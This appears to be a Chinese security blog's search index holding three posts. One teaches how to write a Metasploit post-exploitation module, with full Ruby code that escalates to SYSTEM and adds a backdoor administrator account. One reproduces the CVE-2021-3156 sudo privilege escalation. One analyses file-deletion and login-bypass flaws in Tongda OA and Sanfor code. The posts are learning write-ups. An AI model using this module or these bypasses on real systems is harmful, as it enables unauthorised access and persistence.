<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MSF模块编写初学</title>
    <link href="/2021/04/23/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E7%BC%96%E5%86%99%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2021/04/23/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E7%BC%96%E5%86%99%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>学习文章：(文章99%的代码来自下列学习文章中)</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652475687&idx=1&sn=fa25e7129f9734a577ae2e88caa8a446&chksm=f2583294c52fbb82a1848cb6ebd58537ec0bfe6c09861605265f609804d0ea252a7e40550bf9&scene=178&cur_album_id=1420713294159265793#rd" target="_blank" rel="noopener">雷神众测 - 打造Metasploit</a></p><p><a href="https://www.cnblogs.com/Kali-Team/p/12589630.html" target="_blank" rel="noopener">三米前有蕉皮 - Metasploit后渗透模块开发</a></p></blockquote><p>官方文档：</p><blockquote><p><a href="https://github.com/rapid7/metasploit-framework/blob" target="_blank" rel="noopener">Github源码</a></p><p><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module" target="_blank" rel="noopener">metasploit Post Wiki</a></p></blockquote><p>刚开始看，就挑简单的先写，因为msf使用的函数，需要自己在源码中查看，wiki也有一部分，但是没写全</p><p>不要问我为啥不看，问就是懒，没救了</p><h1 id="0x01-基础格式讲解"><a href="#0x01-基础格式讲解" class="headerlink" title="0x01 基础格式讲解"></a>0x01 基础格式讲解</h1><pre><code class="ruby">require &#39;msf/core&#39;class MetasploitModule &lt; Msf::Post    def initialize(info={})        super(update_info(info,        &#39;Name&#39;          =&gt; &#39;[Platform] [Module Category] [Software] [Function]&#39;,        &#39;Description&#39;   =&gt; %q{          Say something that the user might want to know.        },        &#39;License&#39;       =&gt; MSF_LICENSE,        &#39;Author&#39;        =&gt; [ &#39;Name&#39; ],        &#39;Platform&#39;      =&gt; [ &#39;win&#39;, &#39;linux&#39;, &#39;osx&#39;, &#39;unix&#39;, &#39;bsd&#39; ],        &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39;, &#39;shell&#39; ]        ))    endend</code></pre><p>在MSF中编写模块，无论是编写exploit、Auxiliary、Post或其他模块，都需要导入MSF的核心库<code>require &#39;msf/core&#39;</code></p><p>MSF中规定模块的编写必须在<code>MetasploitModule</code>类中进行编写，类名是固定的！</p><p>类名后的<code>&lt; Msf::Post</code>表示该类继承自MSF核心库中的Post，继承核心库的哪个大模块，根据个人决定</p><blockquote><p>Ps: Ruby不支持多继承，但是Ruby支持mixin来实现</p></blockquote><p><code>initialize</code>构造函数中的<code>super</code>函数写的是该模块的详细信息</p><blockquote><p>Name: 名称</p><p>Description：描述</p><p>Author：作者</p><p>License：许可</p><p>Platform：支持的平台</p><p>SessionTypes：meterpreter支持的session或shell</p></blockquote><h1 id="0x02-检查当前获取的权限"><a href="#0x02-检查当前获取的权限" class="headerlink" title="0x02 检查当前获取的权限"></a>0x02 检查当前获取的权限</h1><pre><code class="ruby">require &#39;msf/core&#39;class MetasploitModule &lt; Msf::Post    include Msf::Post::Windows::Priv    def initialize(info={})        super(update_info(            info,            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},            &#39;License&#39; =&gt; MSF_LICENSE,            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ], # 表示仅支持win平台            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控        ))    endend</code></pre><p><code>include Msf::Post::Windows::Priv</code>：表示包含MSF核心库下的Post模块中windows的Priv文件</p><blockquote><p>这样做，可以在类中直接使用该文件的函数</p><p>Ps: 在Ruby函数调用无参函数时，可以不加括号！！！</p></blockquote><p>文件路径是：<code>/lib/msf/core/post/windows/priv.rb</code></p><p>让代码运行起来，在Post模块下几乎是编写在<code>run()</code>中的，同样是写在MetasploitModule类中</p><pre><code class="ruby">def run    print_status(&quot;检查Session会话权限&quot;)    admin_check = is_admin?    if(admin_check)        print_good(&quot;Current User is Admin&quot;)    else        print_error(&quot;Cuttent User is Not Admin&quot;)    end    # 检查操作系统版本    win_ver = sysinfo[&quot;OS&quot;]    print_good(&quot;Target Os: #{win_ver}&quot;)end</code></pre><p>MSF中的控制台输出语句：（只列举该文中使用的）</p><p>1、<code>print_error(str)</code>：失败打印，红色</p><p>2、<code>print_good(str)</code>：成功打印，绿色</p><p>3、<code>print_status(str)</code>：状态打印，蓝色</p><p><code>is_admin</code>是一个函数，用来检查当前会话的权限，成功返回true，失败fasle</p><blockquote><p><code>is_admin</code>函数来自于：<code>Msf::Post::Windows::Priv</code>，如果不进行包含，则无法进行使用</p></blockquote><h1 id="0x03-MSF导入并使用"><a href="#0x03-MSF导入并使用" class="headerlink" title="0x03 MSF导入并使用"></a>0x03 MSF导入并使用</h1><ul><li>在msf打开的情况下，导入自己使用的模块</li></ul><blockquote><p>把自己写的脚本放入对应的模块中，例如：我这里写的是Post的模块，就放入到Post模块下的windows</p><p>文件名：session_test.rb</p></blockquote><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/0.png" srcset="/img/loading.gif" alt=""></p><p>然后在msf中使用<code>reload_all</code>重新加载全部模块</p><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/1.png" srcset="/img/loading.gif" alt=""></p><ul><li>没打开msf的情况下，导入自己的模块</li></ul><blockquote><p>直接把自己写的脚本放入到对应模块中，然后启用msfconsole使用即可</p></blockquote><p><strong>导入不成功采坑记录：</strong></p><p>1、你的语法有错误，导致了无法成功导入</p><p>2、命名问题</p><blockquote><p>如果还是不行，建议查看MSF的错误日志：<code>/root/.msf4/logs/framework.log</code></p><p>查找错误对应的错误，然后下面有写错误原因</p></blockquote><p>效果查看:</p><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/2.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x04-添加自带提权"><a href="#0x04-添加自带提权" class="headerlink" title="0x04 添加自带提权"></a>0x04 添加自带提权</h1><p>如果当前会话是低权限时，自动尝试获取高权限，然后添加一个选项表示可以手动关闭</p><ul><li>先编写提权函数</li></ul><pre><code class="ruby">def getsystem    results = session.priv.getsystem # 进行getsystem提权    if results[0]        return true # 提权成功    else        return false # 提权失败    endend</code></pre><ul><li>添加选项：使用<code>register_options()</code>进行注册选项</li></ul><blockquote><p>在构造函数initialize中进行注册，可以注册多个基本数据进行存储</p></blockquote><p>注册选项就是在msf中使用<code>show options</code>显示的选项<br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/3.png" srcset="/img/loading.gif" alt=""></p><blockquote><p>Name：名称</p><p>Current Setting：当前设置</p><p>Required：参数是否为必填项，false / true</p><p>Description: 描述</p></blockquote><pre><code class="ruby">register_options([    OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false])    ])</code></pre><blockquote><p>说明：OptBool.new(Name,[Required,Description,Current Setting]),把里面的参数对应上面的说明</p></blockquote><p>直接贴完整的代码：对Run的修改也在其中</p><pre><code class="ruby">require &#39;msf/core&#39;class MetasploitModule &lt; Msf::Post    include Msf::Post::Windows::Priv    def initialize(info={})        super(update_info(            info,            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},            &#39;License&#39; =&gt; MSF_LICENSE,            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ],            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控        ))        register_options([            OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false])        ])    end    # 尝试进行提权    def getsystem        results = session.priv.getsystem # 进行getsystem提权        if results[0]            return true # 提权成功        else            return false # 提权失败        end    end    def adminuser_check        admin_check = is_admin?        if(admin_check)            print_good(&quot;Current User is Admin&quot;)        else            print_error(&quot;Cuttent User is Not Admin&quot;)        end    end    # 程序 Run    def run        print_status(&quot;检查Session会话权限&quot;)        adminuser_check        # 检查操作系统版本        win_ver = sysinfo[&quot;OS&quot;]        print_good(&quot;Target Os: #{win_ver}&quot;)        # 判断是否需要提权        # print_status(&quot;正在尝试提权ing&quot;)        if !is_system? # 判断是不是系统权限            if datastore[&#39;GetSystem&#39;] # 查看默认注册选项，是不是开启的                print_status(&quot;正在尝试提权ing&quot;)                if getsystem                    print_good(&quot;获取权限成功&quot;)                else                    print_error(&quot;获取权限失败&quot;)                end            end        else            print_good(&quot;当前权限为System&quot;)        end    endend</code></pre><p><code>datastore</code>变量中存储的是所有注册选项的值</p><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/4.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x05-添加用户"><a href="#0x05-添加用户" class="headerlink" title="0x05 添加用户"></a>0x05 添加用户</h1><ul><li>注册三个选项：用户和密码及是否添加用户</li></ul><pre><code class="ruby">register_options([    OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false]),    OptBool.new(&#39;Add_user&#39;,[false,&#39;是否添加用户&#39;]),    OptString.new(&#39;UserName&#39;,[false,&#39;用户名&#39;,]),    OptString.new(&#39;PassWord&#39;,[false,&#39;密码&#39;,])])</code></pre><p>在进行添加用户之前，我们需要注意的是该系统中是否该相同的用户！</p><ul><li>枚举当前系统的用户</li></ul><pre><code class="ruby"># 查询当前系统是否包含该用户def check_user(user)    enum_user.include?(user)end</code></pre><p><code>enum_user</code>：枚举用户</p><ul><li>添加用户模块</li></ul><pre><code class="ruby">def adduser    if datastore[&#39;PassWord&#39;].nil? # 判断密码是否创建        # 创建随机8位密码        datastore[&#39;PassWord&#39;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)        print_status(&quot;你没有设置密码，默认密码：#{datastore[&#39;PassWord&#39;]}&quot;)    end    # 添加用户    if check_user(datastore[&#39;UserName&#39;])        print_error(&quot;当前用户已有该用户：#{datastore[&#39;UserName&#39;]}&quot;)        return    else        result = add_user(datastore[&#39;UserName&#39;],datastore[&#39;PassWord&#39;]) # 添加用户        if result[&#39;return&#39;] == 0            print_good(&quot;添加用户：#{datastore[&#39;UserName&#39;]} : #{datastore[&#39;PassWord&#39;]}&quot;)        else            print_error(&quot;添加用户失败&quot;)        end    endend</code></pre><p><code>datastore[&#39;PassWord&#39;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)</code></p><p>当用户没有设置密码的时候，我们创建一个8位的随机密码给用户</p><blockquote><p><code>rand_text_alphanumeric</code>：生成随机字母字符</p><p><code>rand_text_numeric</code>：生成随机数字字符</p></blockquote><p>这两个函数位于：<code>/lib/msf/core/exploit.rb</code>中</p><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/5.png" srcset="/img/loading.gif" alt=""></p><p><code>add_user(用户，密码)</code>：添加用户的函数</p><blockquote><p>文件位置：<code>/lib/msf/core/post/windows/accounts.rb</code></p></blockquote><ul><li>完整代码和使用效果</li></ul><pre><code class="ruby">require &#39;msf/core&#39;class MetasploitModule &lt; Msf::Post    include Msf::Post::Windows::Priv    def initialize(info={})        super(update_info(            info,            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},            &#39;License&#39; =&gt; MSF_LICENSE,            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ],            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控        ))        register_options([            OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false]),            OptBool.new(&#39;Add_user&#39;,[false,&#39;是否添加用户&#39;]),            OptString.new(&#39;UserName&#39;,[false,&#39;用户名&#39;,]),            OptString.new(&#39;PassWord&#39;,[false,&#39;密码&#39;,])        ])    end    # 尝试进行提权    def getsystem        results = session.priv.getsystem # 进行getsystem提权        if results[0]            return true # 提权成功        else            return false # 提权失败        end    end    def adminuser_check        admin_check = is_admin?        if(admin_check)            print_good(&quot;Current User is Admin&quot;)        else            print_error(&quot;Cuttent User is Not Admin&quot;)        end    end    # 查询当前系统是否包含该用户    def check_user(user)        enum_user.include?(user)    end    # 添加用户    def adduser(username,password)        if password.nil? # 判断密码是否创建            # 创建随机8位密码            password = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)            print_status(&quot;你没有设置密码，默认密码：#{password}&quot;)        end        # 添加用户        if check_user(username)            print_error(&quot;当前用户已有该用户：#{username}&quot;)            return        else            result = add_user(username,password) # 添加用户            if result[&#39;return&#39;] == 0                print_good(&quot;添加用户：#{username} : #{password}&quot;)            else                print_error(&quot;添加用户失败&quot;)            end        end    end    # 程序 Run    def run        print_status(&quot;检查Session会话权限&quot;)        adminuser_check        # 检查操作系统版本        win_ver = sysinfo[&quot;OS&quot;]        print_good(&quot;Target Os: #{win_ver}&quot;)        # 判断是否需要提权        # print_status(&quot;正在尝试提权ing&quot;)        if !is_system? # 判断是不是系统权限            if datastore[&#39;GetSystem&#39;] # 查看默认注册选项，是不是开启的                print_status(&quot;正在尝试提权ing&quot;)                if getsystem                    print_good(&quot;获取权限成功&quot;)                else                    print_error(&quot;获取权限失败&quot;)                end            end        else            print_good(&quot;当前权限为System&quot;)        end        # 添加用户        if datastore[&#39;Add_user&#39;]            adduser(datastore[&#39;UserName&#39;],datastore[&#39;PassWord&#39;])        end    endend</code></pre><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/6.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x06-添加到本地用户组"><a href="#0x06-添加到本地用户组" class="headerlink" title="0x06 添加到本地用户组"></a>0x06 添加到本地用户组</h1><p>这里就不用注册什么选项了，毕竟一般添加用户名都是直接添加到管理员组一步到位！直接改脚本即可</p><ul><li>修改adduser函数</li></ul><pre><code class="ruby"># 添加用户def adduser(username,password)    if password.nil? # 判断密码是否创建    # 创建随机8位密码        password = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)        print_status(&quot;你没有设置密码，默认密码：#{password}&quot;)    end    admin_sid = resolve_sid(&quot;S-1-5-32-544&quot;) # 处理sid    if !admin_sid[:mapped]        print_error(&quot;Administrators group is not mapped&quot;) if !admin_sid[:mapped] # 没有映射Administrators组        print_error(&quot;Not adding user #{username}&quot;) # 没有添加用户        return    end    admin = admin_sid[:name] # 本地组名    # 添加用户    if check_user(username)        print_error(&quot;当前用户已有该用户：#{username}&quot;)        return    else        result = add_user(username,password) # 添加用户        if result[&#39;return&#39;] == 0            print_good(&quot;添加用户：#{username} : #{password}&quot;)            add_members_localgroup(admin,username)            print_good(&quot;添加到管理员组成功！&quot;)        else            print_error(&quot;添加失败&quot;)        end    endend</code></pre><p><code>resolve_sid(SID)</code>：检查指定的SID帐户</p><p><code>add_members_localgroup(localgroup, username)</code>：添加进管理员组</p><blockquote><p>文件路径：<code>/lib/msf/core/post/windows/accounts.rb</code></p></blockquote><ul><li>完整代码</li></ul><pre><code class="ruby">require &#39;msf/core&#39;class MetasploitModule &lt; Msf::Post    include Msf::Post::Windows::Priv    def initialize(info={})        super(update_info(            info,            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},            &#39;License&#39; =&gt; MSF_LICENSE,            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ],            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控        ))        register_options([            OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false]),            OptBool.new(&#39;Add_user&#39;,[false,&#39;是否添加用户&#39;]),            OptString.new(&#39;UserName&#39;,[false,&#39;用户名&#39;,]),            OptString.new(&#39;PassWord&#39;,[false,&#39;密码&#39;,])        ])    end    # 尝试进行提权    def getsystem        results = session.priv.getsystem # 进行getsystem提权        if results[0]            return true # 提权成功        else            return false # 提权失败        end    end    def adminuser_check        admin_check = is_admin?        if(admin_check)            print_good(&quot;Current User is Admin&quot;)        else            print_error(&quot;Cuttent User is Not Admin&quot;)        end    end    # 查询当前系统是否包含该用户    def check_user(user)        enum_user.include?(user)    end    # 添加用户    def adduser(username,password)        if password.nil? # 判断密码是否创建            # 创建随机8位密码            password = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)            print_status(&quot;你没有设置密码，默认密码：#{password}&quot;)        end        admin_sid = resolve_sid(&quot;S-1-5-32-544&quot;) # 处理sid        if !admin_sid[:mapped]            print_error(&quot;Administrators group is not mapped&quot;) if !admin_sid[:mapped] # 没有映射Administrators组            print_error(&quot;Not adding user #{username}&quot;) # 没有添加用户            return        end        admin = admin_sid[:name]        # 添加用户        if check_user(username)            print_error(&quot;当前用户已有该用户：#{username}&quot;)            return        else            result = add_user(username,password) # 添加用户            if result[&#39;return&#39;] == 0                print_good(&quot;添加用户：#{username} : #{password}&quot;)                add_members_localgroup(admin,username)                print_good(&quot;添加到管理员组成功！&quot;)            else                print_error(&quot;添加失败&quot;)            end        end    end    # 程序 Run    def run        print_status(&quot;检查Session会话权限&quot;)        adminuser_check        # 检查操作系统版本        win_ver = sysinfo[&quot;OS&quot;]        print_good(&quot;Target Os: #{win_ver}&quot;)        # 判断是否需要提权        # print_status(&quot;正在尝试提权ing&quot;)        if !is_system? # 判断是不是系统权限            if datastore[&#39;GetSystem&#39;] # 查看默认注册选项，是不是开启的                print_status(&quot;正在尝试提权ing&quot;)                if getsystem                    print_good(&quot;获取权限成功&quot;)                else                    print_error(&quot;获取权限失败&quot;)                end            end        else            print_good(&quot;当前权限为System&quot;)        end        # 添加用户        if datastore[&#39;Add_user&#39;]            adduser(datastore[&#39;UserName&#39;],datastore[&#39;PassWord&#39;])        end    endend</code></pre><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/7.png" srcset="/img/loading.gif" alt=""></p><ul><li>总结：</li></ul><blockquote><p>使用MSF编写模块，大部分情况下使用MSF自带的函数就可以完成</p><p>唯一让人头疼的就是，模块有点多，需要你自己查看函数的定义</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-3156 Sudo提权漏洞复现</title>
    <link href="/2021/02/01/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/"/>
    <url>/2021/02/01/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>2021年1月26日，Sudo发布安全通告，修了一个基于堆的缓冲区溢出</p><p>任何本地用户，都可以利用此漏洞，而无需进行身份验证</p><blockquote><p>Ps：攻击者不需要知道用户的密码，成功利用此漏洞可获得root权限</p></blockquote><p>检查方法：以非root用户登录系统，并使用命令<code>sudoedit -s /</code></p><ul><li>以<code>sudoedit</code>开头的错误，表示可能存在漏洞</li><li>以<code>usage</code>开头的错误，表明补丁已生效</li></ul><p>影响版本众多就不一一列举了</p><blockquote><p>不影响版本 sudo =&gt; 1.9.5 p2</p></blockquote><p>sudo官方位于1月26日已经修复，后面安装的sudo已经补上了</p><blockquote><p>前天测试的时候Ubuntu最新版本已经补上</p></blockquote><p><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/1.png" srcset="/img/loading.gif" alt=""></p><hr><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>复现环境：Ubuntu 19.0.4</p><ul><li>检查漏洞是否存在</li></ul><pre><code class="bash">sudoedit -s /</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/2.png" srcset="/img/loading.gif" alt=""></p><blockquote><p>sudoedit 开头，说明可能存在漏洞</p></blockquote><ul><li>编译POC项目：<code>make</code></li></ul><p><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/3.png" srcset="/img/loading.gif" alt=""></p><p>编译成功后，POC项目下会多出来一个<code>sudo-hax-me-a-sandwich</code>文件</p><ul><li>执行漏洞利用：<code>sudo-hax-me-a-sandwich</code></li></ul><p><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/4.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OA和深信服漏洞 简略分析</title>
    <link href="/2020/08/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E9%80%9A%E8%BE%BE%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2020/08/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E9%80%9A%E8%BE%BE%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="OA-任意文件删除"><a href="#OA-任意文件删除" class="headerlink" title="OA - 任意文件删除"></a>OA - 任意文件删除</h1><p>实测影响版本：通达OA V11.6（其他版本未测）</p><p>根据网上的exp直接定位到漏洞文件<code>MYOA\webroot\module\appbuilder\assets\print.php</code></p><p>通达OA的文件需要进行解密才可以进行查看源码，否则是乱码</p><p>解密后，内容如下：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/1.png" srcset="/img/loading.gif" alt=""></p><p>可以看到该页面并没有何的需要登录验证的文件包含</p><p>并且<code>$s_tmp</code>的并没进行任何的过滤直接带入了<code>unlink()</code>删除文件函数中</p><p>导致了任意文件的删除！</p><p>起始目录：<code>/../../../../logs/appbuilder/logs/</code></p><p>漏洞验证：删除一个txt文件</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/2.gif" srcset="/img/loading.gif" alt=""></p><p>至于文件上传，看的有点糊涂就不写了</p><hr><h1 id="深信服任意文件登录"><a href="#深信服任意文件登录" class="headerlink" title="深信服任意文件登录"></a>深信服任意文件登录</h1><ul><li>漏洞文件：<code>ui/login.php</code></li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/3.png" srcset="/img/loading.gif" alt=""></p><p>看构造进行Session前的if语句</p><pre><code class="php">if((isset($_SERVER[&quot;REMOTE_ADDR&quot;]) &amp;&amp; (&quot;127.0.0.2&quot; == $_SERVER[&quot;REMOTE_ADDR&quot;] || &quot;127.0.0.1&quot; == $_SERVER[&quot;REMOTE_ADDR&quot;]))            || $docker)        {            //构造session            if(isset($_GET[&quot;user&quot;]))            {                $auth_value[&quot;auth_user&quot;] = $_GET[&quot;user&quot;];            }            elseif($docker)            {                $auth_value[&quot;auth_user&quot;] = $username;            }            else            {                //$auth_value[&quot;auth_user&quot;] = &quot;SCLOUDE&quot;;                //免密登录后，人为loginout，还是需要密码登录，url不一样                return;            }            session_start();</code></pre><p>先判断了<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>是否存在，接着判断了<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>是否等于<code>127.0.0.2</code>或<code>127.0.0.1</code>以及<code>$docker</code></p><blockquote><p>不知道哪里出了问题，导致了<code>$_SERVER[&quot;REMOTE_ADDR&quot;] == 127.0.0.1</code>为真</p><p>所以等于这个判断为永真，直接就进入到了构造session的环节</p></blockquote><pre><code class="php">//构造sessionif(isset($_GET[&quot;user&quot;])){    $auth_value[&quot;auth_user&quot;] = $_GET[&quot;user&quot;];}elseif($docker){    $auth_value[&quot;auth_user&quot;] = $username;}else{    //$auth_value[&quot;auth_user&quot;] = &quot;SCLOUDE&quot;;    //免密登录后，人为loginout，还是需要密码登录，url不一样    return;            }session_start();</code></pre><p>如果存在<code>$_GET[&quot;user&quot;]</code>则直接写入到<code>$auth_value[&quot;auth_user&quot;]</code>中，没有进行任何的过滤</p><pre><code class="php">$_SESSION[&quot;auth_user_info&quot;] = $auth_value;</code></pre><p>也就是说用户名是直接带入到<code>$_SESSION[&quot;auth_user_info&quot;]</code>中的，并且是可以控制的</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/4.png" srcset="/img/loading.gif" alt=""></p><p>调用了一些函数，但是该php中并没有定义，跟进文件开始时包含的<code>platform</code>查看相应函数的代码</p><ul><li><code>ui/platform.php</code></li></ul><p><code>user_logined_get()</code>：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/5.png" srcset="/img/loading.gif" alt=""></p><p>有问题的if判断：条件为真，则<code>$login_user</code>获取登录到后台管理员的用户名</p><pre><code class="php">if (isset($_SESSION[&quot;auth_user_info&quot;][&quot;authed&quot;]) and $_SESSION[&quot;auth_user_info&quot;][&quot;authed&quot;] === true ){    $login_user = $_SESSION[&quot;auth_user_info&quot;][&quot;auth_user&quot;];}</code></pre><p>先判断了<code>isset($_SESSION[&quot;auth_user_info&quot;][&quot;authed&quot;])</code>是否存在</p><p>接着判断<code>$_SESSION[&quot;auth_user_info&quot;][&quot;authed&quot;] === true</code>是否全等于true</p><p>这两个判断条件是有问题的</p><p>因为在<code>login.php</code>中<code>$_SESSION[&quot;auth_user_info&quot;][&quot;authed&quot;]</code>已经默认设置为<code>true</code></p><p>所以该判断条件是为永真的，像当于直接就执行了<code>$login_user = $_SESSION[&quot;auth_user_info&quot;][&quot;auth_user&quot;];</code></p><blockquote><p>Ps：<code>$_SESSION[&quot;auth_user_info&quot;][&quot;auth_user&quot;]</code>是在<code>login.php</code>中由<code>$_GET[&quot;user&quot;]</code>可控参数获取的</p></blockquote><p>接着查看判断是否为超级管理员的函数</p><p><code>admin_login_check()</code>：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/6.png" srcset="/img/loading.gif" alt=""></p><p>和前面函数判断一样，都是if判断出现了逻辑问题，并且用户名是可控的</p><p>即：<code>$_GET[&quot;user&quot;]= admin</code>即为超级管理员权限</p><pre><code class="php">// login.phpheader(&#39;Location: index.php&#39;);</code></pre><p><code>login.php</code>的<code>check_free_loginbyscl()</code>执行到最后，跳转到了<code>index.php</code>页面</p><ul><li><code>ui/index.php</code></li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/7.png" srcset="/img/loading.gif" alt=""></p><p>查看获取用户权限的函数：<code>ui/platform.php</code>文件中</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/8.png" srcset="/img/loading.gif" alt=""></p><p>发现该函数过度信任admin用户，只要是admin用户则一直为管理员</p><p>接着查看<code>index.php</code>获取用户权限函数后的两个if语句</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/9.png" srcset="/img/loading.gif" alt=""></p><p><code>$_SESSION[&quot;is_bbs_login&quot;]</code>在<code>login.php</code>中已经默认设置为<code>true</code></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/OA%E5%92%8C%E6%B7%B1%E4%BF%A1%E6%9C%8D/10.png" srcset="/img/loading.gif" 